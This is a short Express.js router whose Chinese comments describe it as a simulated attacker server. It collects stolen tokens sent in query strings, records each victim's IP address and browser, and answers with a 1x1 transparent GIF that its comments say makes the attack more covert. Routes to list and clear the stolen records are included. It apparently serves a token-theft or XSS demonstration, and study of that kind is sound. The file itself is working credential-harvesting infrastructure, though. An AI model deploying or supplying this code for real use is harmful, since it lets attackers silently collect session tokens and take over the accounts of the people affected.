import { Router } from 'express'

const router = Router()

// 存储被窃取的凭证
const stolenTokens = []

// 模拟攻击者服务器 - 接收窃取的 token
router.get('/', (req, res) => {
  const { token } = req.query
  
  if (token) {
    const record = {
      token,
      ip: req.ip,
      userAgent: req.get('User-Agent'),
      time: new Date().toLocaleString('zh-CN')
    }
    stolenTokens.push(record)
    
    console.log('\n🚨 ========== TOKEN 被窃取 ==========')
    console.log('Token:', token)
    console.log('IP:', req.ip)
    console.log('Time:', record.time)
    console.log('=====================================\n')
  }
  
  // 返回 1x1 透明图片，让攻击更隐蔽
  const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64')
  res.set('Content-Type', 'image/gif')
  res.send(pixel)
})

// 查看所有被窃取的 token
router.get('/list', (req, res) => {
  res.json({
    count: stolenTokens.length,
    tokens: stolenTokens
  })
})

// 清空记录
router.delete('/clear', (req, res) => {
  stolenTokens.length = 0
  res.json({ success: true, message: '记录已清空' })
})

export default router
